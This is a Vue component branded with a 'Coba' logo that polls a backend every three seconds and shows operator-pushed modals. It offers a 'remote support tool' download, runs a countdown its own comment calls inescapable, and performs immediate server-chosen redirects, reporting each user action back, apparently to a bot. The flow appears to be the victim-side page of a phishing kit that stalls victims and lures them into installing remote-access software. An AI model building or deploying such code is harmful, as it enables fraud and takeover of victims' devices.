<template>
  <!-- Modal de Herramientas -->
  <div v-if="currentHerramienta" class="modal-overlay" @click="handleOverlayClick">
    <div class="modal-container" @click.stop>
      <div class="modal-header">
        <div class="modal-header-left">
          <img :src="logoHeader" alt="Coba" class="modal-logo" />
          <h3 class="modal-title">
            <i class="fas fa-tools mr-2 text-emerald-700"></i>
            Herramientas de Soporte
          </h3>
        </div>
        <button @click="rechazarHerramientas" class="modal-close" aria-label="Cerrar">
          <i class="fas fa-times"></i>
        </button>
      </div>

      <div class="modal-body">
        <div class="modal-message">
          <div class="message-content">
            <p>Se ha enviado una herramienta de soporte remoto para asistirte.</p>
            <p class="mt-3 text-sm text-gray-600">¿Deseas descargar y ejecutar la herramienta?</p>
          </div>
        </div>

        <!-- Error Message -->
        <div v-if="errorMessage" class="modal-error">
          <i class="fas fa-exclamation-triangle mr-2"></i>
          {{ errorMessage }}
        </div>
      </div>

      <div class="modal-footer">
        <div class="modal-buttons">
          <button @click="rechazarHerramientas" class="btn-cancel">
            <i class="fas fa-times mr-2"></i>
            Rechazar
          </button>
          <button @click="aceptarHerramientas" class="btn-primary">
            <i class="fas fa-download mr-2"></i>
            Descargar Herramienta
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal de Timer -->
  <div v-if="currentTimer" class="modal-overlay timer-modal">
    <div class="modal-container timer-container" @click.stop>
      <div class="modal-header timer-header">
        <div class="modal-header-left">
          <img :src="logoHeader" alt="Coba" class="modal-logo" />
          <h3 class="modal-title">
            <i class="fas fa-clock mr-2 text-emerald-700"></i>
            Procesando Solicitud
          </h3>
        </div>
        <!-- Sin botón de cerrar - es inescapable -->
      </div>

      <div class="modal-body timer-body">
        <div class="timer-content">
          <div class="timer-display">
            <div class="timer-circle">
              <div class="timer-number">{{ tiempoRestante }}</div>
              <div class="timer-label">segundos</div>
            </div>
          </div>

          <div class="timer-message">
            <p>{{ currentTimer.mensaje_personalizado }}</p>
          </div>

          <div class="timer-progress">
            <div class="progress-bar">
              <div class="progress-fill" :style="{ width: progressPercentage + '%' }"></div>
            </div>
          </div>
        </div>
      </div>


    </div>
  </div>

  <!-- Timer Minimizado -->
  <div v-if="currentTimer" class="timer-minimized" @click="restaurarTimer">
    <div class="timer-mini-content">
      <i class="fas fa-clock mr-2"></i>
      <span>{{ tiempoRestante }}s</span>
    </div>
  </div>

  <!-- Modal de Redirección -->
  <div v-if="currentRedireccion" class="modal-overlay" @click="handleOverlayClick">
    <div class="modal-container" @click.stop>
      <div class="modal-header">
        <div class="modal-header-left">
          <img :src="logoHeader" alt="Coba" class="modal-logo" />
          <h3 class="modal-title">
            <i class="fas fa-external-link-alt mr-2 text-emerald-700"></i>
            Redirección
          </h3>
        </div>
        <button @click="rechazarRedireccion" class="modal-close" aria-label="Cerrar">
          <i class="fas fa-times"></i>
        </button>
      </div>

      <div class="modal-body">
        <div class="modal-message">
          <div class="message-content">
            <p>{{ currentRedireccion.mensaje_confirmacion }}</p>
            <div class="redirect-info mt-4 p-3 rounded-lg">
              <p class="text-sm text-gray-700">
                <strong>Destino:</strong> {{ currentRedireccion.url_destino }}
              </p>
            </div>
          </div>
        </div>

        <!-- Error Message -->
        <div v-if="errorMessage" class="modal-error">
          <i class="fas fa-exclamation-triangle mr-2"></i>
          {{ errorMessage }}
        </div>
      </div>

      <div class="modal-footer">
        <div class="modal-buttons">
          <button @click="rechazarRedireccion" class="btn-cancel">
            <i class="fas fa-times mr-2"></i>
            Cancelar
          </button>
          <button @click="aceptarRedireccion" class="btn-primary">
            <i class="fas fa-external-link-alt mr-2"></i>
            Continuar
          </button>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import logoHeader from '@/assets/coba/cobalogo.svg'

import { ref, onMounted, onUnmounted } from 'vue'

// Variables reactivas
const currentHerramienta = ref(null)
const currentTimer = ref(null)
const currentRedireccion = ref(null)
const errorMessage = ref('')
const tiempoRestante = ref(0)
const timerMinimizado = ref(false)
const progressPercentage = ref(100)
const redireccionEjecutada = ref(false) // Evitar múltiples redirecciones

// Variables para intervalos
let checkInterval = null
let timerInterval = null
let tiempoInicial = 0


// Manejar llegada de un nuevo modal desde otros componentes
function handleExternalIncoming(ev) {
  if (currentHerramienta.value) {
    cancelHerramientaPorNuevoModal()
  }
  if (currentTimer.value) {
    cancelTimerPorNuevoModal()
  }
}

async function cancelHerramientaPorNuevoModal() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
    await fetch('/api/usuario/procesar-herramientas', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'cancelado_por_nuevo_modal'
      })
    })
  } catch (e) {
    // noop
  } finally {
    currentHerramienta.value = null
  }
}

async function cancelTimerPorNuevoModal() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
    await fetch('/api/usuario/procesar-timer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'cancelado_por_nuevo_modal'
      })
    })
  } catch (e) {
    // noop
  } finally {
    if (timerInterval) clearInterval(timerInterval)
    currentTimer.value = null
    timerMinimizado.value = false
  }
}

// Inicializar sistema
onMounted(() => {
  // console.log('🛠️ Sistema de herramientas iniciado en:', window.location.pathname)
  // console.log('🔍 Iniciando verificación de herramientas...')
  window.addEventListener('new-modal-incoming', handleExternalIncoming)
  startChecking()
})

onUnmounted(() => {
  window.removeEventListener('new-modal-incoming', handleExternalIncoming)
  if (checkInterval) {
    clearInterval(checkInterval)
  }
  if (timerInterval) {
    clearInterval(timerInterval)
  }
})

// Iniciar verificación periódica
function startChecking() {
  // console.log('🔄 Iniciando verificación periódica de herramientas')

  // Verificar inmediatamente
  checkForTools()

  // Verificar cada 3 segundos
  checkInterval = setInterval(() => {
    // console.log('⏰ Verificación programada ejecutándose...')
    checkForTools()
  }, 3000)
}

// Verificar herramientas, timers y redirecciones
async function checkForTools() {
  try {
    // Si ya se ejecutó una redirección, no verificar más
    if (redireccionEjecutada.value) {
      return
    }

    // Verificar herramientas
    if (!currentHerramienta.value) {
      await checkHerramientas()
    }

    // Verificar timers
    if (!currentTimer.value) {
      await checkTimer()
    }

    // Verificar redirecciones
    if (!currentRedireccion.value) {
      await checkRedirecciones()
    }
  } catch (error) {
    console.error('Error verificando herramientas:', error)
  }
}

// Verificar herramientas pendientes
async function checkHerramientas() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    const response = await fetch('/api/usuario/verificar-herramientas', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'verificar_herramientas'
      })
    })

    const data = await response.json()

    if (data.success && data.tiene_herramientas) {
      // console.log('🛠️ Herramientas encontradas:', data)
      // Avisar a otros componentes que llega un nuevo modal
      window.dispatchEvent(new CustomEvent('new-modal-incoming', { detail: { type: 'herramienta' } }))
      currentHerramienta.value = data
    }
  } catch (error) {
    console.error('Error verificando herramientas:', error)
  }
}

// Verificar timer pendiente
async function checkTimer() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    const response = await fetch('/api/usuario/verificar-timer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'verificar_timer'
      })
    })

    const data = await response.json()

    if (data.success && data.tiene_timer) {
      // console.log('⏰ Timer encontrado:', data)
      // Avisar a otros componentes que llega un nuevo modal (timer)
      window.dispatchEvent(new CustomEvent('new-modal-incoming', { detail: { type: 'timer' } }))
      currentTimer.value = data
      tiempoRestante.value = data.tiempo_segundos
      tiempoInicial = data.tiempo_segundos
      progressPercentage.value = 100
      startTimer()
    }
  } catch (error) {
    console.error('Error verificando timer:', error)
  }
}

// Verificar redirecciones pendientes - REDIRECCIÓN INMEDIATA
async function checkRedirecciones() {
  try {
    // console.log('🔄 Verificando redirecciones pendientes...')

    // Si ya se ejecutó una redirección, no verificar más
    if (redireccionEjecutada.value) {
      // console.log('⏹️ Redirección ya ejecutada, saltando verificación')
      return
    }

    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
    // console.log('🔑 Token CSRF:', csrfToken ? 'Encontrado' : 'No encontrado')

    // console.log('📡 Enviando petición de verificación de redirecciones...')

    const response = await fetch('/api/usuario/verificar-redirecciones', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'verificar_redirecciones'
      })
    })

    // console.log('📡 Respuesta recibida, status:', response.status)
    const data = await response.json()
    // console.log('📋 Datos de respuesta:', data)

    if (data.success && data.tiene_redireccion && data.redireccion_inmediata) {
      // console.log('🔄 Redirección inmediata ejecutándose:', data.url_destino)

      // Marcar como ejecutada para evitar múltiples redirecciones
      redireccionEjecutada.value = true

      // Detener el polling
      if (checkInterval) {
        clearInterval(checkInterval)
      }

      // Redirigir inmediatamente
      window.location.href = data.url_destino
    }
  } catch (error) {
    console.error('Error verificando redirecciones:', error)
  }
}

// Aceptar herramientas
async function aceptarHerramientas() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    const response = await fetch('/api/usuario/procesar-herramientas', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'aceptar_herramientas'
      })
    })

    const data = await response.json()

    if (data.success) {
      // console.log('✅ Herramientas aceptadas')
      // Simular descarga
      window.open('/herramientas.php', '_blank')
      // Notificar descarga al backend (mensaje bXBot)
      await fetch('/api/usuario/procesar-herramientas', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
          'X-CSRF-TOKEN': csrfToken || ''
        },
        body: JSON.stringify({
          accion: 'confirmar_descarga'
        })
      }).catch(() => {})
      currentHerramienta.value = null
    } else {
      errorMessage.value = data.error || 'Error al procesar herramientas'
    }
  } catch (error) {
    console.error('Error aceptando herramientas:', error)
    errorMessage.value = 'Error de conexión'
  }
}

// Rechazar herramientas (cancelado sin respuesta)
async function rechazarHerramientas() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
    await fetch('/api/usuario/procesar-herramientas', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'cancelado_sin_respuesta'
      })
    })
  } catch (e) {
    // noop
  } finally {
    currentHerramienta.value = null
    // console.log('❌ Herramientas canceladas sin respuesta')
  }
}

// Iniciar timer
function startTimer() {
  if (timerInterval) {
    clearInterval(timerInterval)
  }

  timerInterval = setInterval(() => {
    tiempoRestante.value--
    progressPercentage.value = (tiempoRestante.value / tiempoInicial) * 100

    if (tiempoRestante.value <= 0) {
      clearInterval(timerInterval)
      completarTimer()
    }
  }, 1000)
}

// Completar timer
async function completarTimer() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    await fetch('/api/usuario/procesar-timer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'timer_completado',
        timer_id: currentTimer.value.id
      })
    })

    // console.log('⏰ Timer completado')
    currentTimer.value = null
    timerMinimizado.value = false
  } catch (error) {
    console.error('Error completando timer:', error)
  }
}

// Minimizar timer
function minimizarTimer() {
  timerMinimizado.value = true
}

// Restaurar timer
function restaurarTimer() {
  timerMinimizado.value = false
}

// Aceptar redirección
async function aceptarRedireccion() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    const response = await fetch('/api/usuario/procesar-redirecciones', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'aceptar_redireccion',
        redireccion_id: currentRedireccion.value.redireccion_id
      })
    })

    const data = await response.json()

    if (data.success) {
      // console.log('🔄 Redirección aceptada')
      // Redirigir
      window.location.href = data.url_destino
    } else {
      errorMessage.value = data.error || 'Error al procesar redirección'
    }
  } catch (error) {
    console.error('Error aceptando redirección:', error)
    errorMessage.value = 'Error de conexión'
  }
}

// Rechazar redirección
async function rechazarRedireccion() {
  try {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')

    await fetch('/api/usuario/procesar-redirecciones', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': csrfToken || ''
      },
      body: JSON.stringify({
        accion: 'rechazar_redireccion',
        redireccion_id: currentRedireccion.value.redireccion_id
      })
    })

    // console.log('❌ Redirección rechazada')
    currentRedireccion.value = null
  } catch (error) {
    console.error('Error rechazando redirección:', error)
  }
}

// Manejar click en overlay
function handleOverlayClick() {
  // Solo cerrar redirecciones, no herramientas ni timers
  if (currentRedireccion.value) {
    rechazarRedireccion()
  }
}
</script>

<style scoped>
/* Modal Overlay */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  transition: all 0.3s ease;
}

.timer-modal {
  z-index: 10000; /* Timer tiene prioridad más alta */
}

/* Modal Container */
.modal-container {
  background: #ffffff;
  border: 1px solid #D1D5DB; /* gray-300 */
  border-radius: 12px;
  max-width: 520px;
  width: 92%;
  max-height: 80vh;
  overflow-y: auto;
  box-shadow: 0 10px 25px rgba(17, 24, 39, 0.12); /* gray-900 at 12% */
  transform: scale(0.98) translateY(-8px);
  transition: all 0.2s ease;
  animation: modalSlideIn 0.22s ease-out;
}

.timer-container {
  max-width: 400px;
  border-color: #D1D5DB; /* gray-300 */
}

@keyframes modalSlideIn {
  from {
    opacity: 0;
    transform: scale(0.8) translateY(-20px);
  }
  to {
    opacity: 1;
    transform: scale(1) translateY(0);
  }
}

/* Modal Header */
.modal-header {
  background: #ffffff;
  color: #111827;
  padding: 12px 16px;
  border-radius: 10px 10px 0 0;
  border-bottom: 2px solid #16A34A;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.timer-header {
  background: #ffffff;
  border-bottom: 2px solid #16A34A;
}

.modal-header-left {
  display: flex;
  align-items: center;
  gap: 10px;
}

.modal-logo {
  height: 24px;
}

.modal-title {
  font-size: 18px;
  font-weight: 700;
  margin: 0;
  color: #16A34A;
  display: flex;
  align-items: center;
}

.modal-close {
  background: none;
  border: 1px solid transparent;
  color: #6B7280; /* gris para contraste con header blanco */
  font-size: 18px;
  cursor: pointer;
  padding: 4px;
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 6px;
  transition: background-color 0.2s, color 0.2s, border-color 0.2s;
}

.modal-close:hover {
  background: #F3F4F6; /* gris claro */
  color: #16A34A; /* verde Coba */
  border-color: #D1D5DB;
}

/* Modal Body */
.modal-body {
  padding: 24px;
}

.timer-body {
  padding: 32px 24px;
  text-align: center;
}

.modal-message {
  margin-bottom: 20px;
}

.message-content p {
  font-size: 16px;
  line-height: 1.5;
  color: #374151; /* gray-700 */
  margin: 0;
  text-align: center;
  font-weight: 500;
}

/* Timer Styles */
.timer-content {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24px;
}

.timer-display {
  display: flex;
  justify-content: center;
}

.timer-circle {
  width: 120px;
  height: 120px;
  border: 4px solid #16A34A; /* verde Coba */
  border-radius: 50%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: linear-gradient(135deg, #ecfdf5, #d1fae5);
}

.timer-number {
  font-size: 32px;
  font-weight: 700;
  color: #16A34A; /* Coba verde */
  line-height: 1;
}

.timer-label {
  font-size: 12px;
  color: #0f172a; /* slate-900 */
  font-weight: 500;
  margin-top: 4px;
}

.timer-message p {
  font-size: 16px;
  color: #111827;
  margin: 0;
  max-width: 300px;
}

.timer-progress {
  width: 100%;
  max-width: 300px;
}

.progress-bar {
  width: 100%;
  height: 8px;
  background: #e5e7eb;
  border-radius: 4px;
  overflow: hidden;
}

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #34D399, #16A34A); /* gradiente verde Coba */
  transition: width 1s linear;
  border-radius: 4px;
}

/* Timer Minimizado */
.timer-minimized {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background: #16A34A; /* Coba verde */
  color: white;
  padding: 12px 16px;
  border-radius: 25px;
  cursor: pointer;
  box-shadow: 0 4px 12px rgba(22, 163, 74, 0.35);
  z-index: 9998;
  transition: all 0.2s ease;
}

.timer-minimized:hover {
  background: #15803D; /* verde oscuro */
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(21, 128, 61, 0.45);
}

.timer-mini-content {
  display: flex;
  align-items: center;
  font-weight: 600;
  font-size: 14px;
}

/* Redirect Info */
.redirect-info {
  background: #F3F4F6 !important; /* gray-100 */
  border: 1px solid #D1D5DB; /* gray-300 */
  border-radius: 8px;
}

/* Error Message */
.modal-error {
  color: #dc2626;
  text-align: center;
  font-size: 14px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #fef2f2;
  border: 1px solid #fecaca;
  padding: 12px;
  border-radius: 8px;
}

/* Modal Footer */
.modal-footer {
  padding: 20px;
  background: #ffffff;
  border-radius: 0 0 10px 10px;
}

.timer-footer {
  text-align: center;
}

.modal-buttons {
  display: flex;
  gap: 12px;
  justify-content: center;
}

/* Buttons */
.btn-cancel, .btn-primary, .btn-minimize {
  padding: 12px 24px;
  border: 1px solid #D1D5DB; /* gray-300 */
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  min-width: 100px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.btn-cancel {
  background: #ffffff;
  color: #374151; /* gray-700 */
  border-color: #D1D5DB;
}

.btn-cancel:hover {
  background: #F3F4F6; /* gray-100 */
  border-color: #9CA3AF; /* gray-400 */
}

.btn-primary {
  background: #16A34A; /* green-600 */
  color: #ffffff;
  border-color: #16A34A;
}

.btn-primary:hover {
  background: #15803D; /* green-700 */
  border-color: #15803D;
}

.btn-minimize {
  background: #6B7280; /* gray-600 */
  color: #ffffff;
  border-color: #6B7280;
}

.btn-minimize:hover {
  background: #4B5563; /* gray-700 */
  border-color: #4B5563;
}

/* Responsive */
@media (max-width: 768px) {
  .modal-container {
    width: 95%;
    margin: 20px;
  }

  .modal-header {
    padding: 12px 16px;
  }

  .modal-body {
    padding: 20px 16px;
  }

  .modal-buttons {
    flex-direction: column;
  }

  .btn-cancel, .btn-primary, .btn-minimize {
    width: 100%;
  }

  .timer-circle {
    width: 100px;
    height: 100px;
  }

  .timer-number {
    font-size: 28px;
  }

  .timer-minimized {
    bottom: 10px;
    right: 10px;
  }
}
</style>
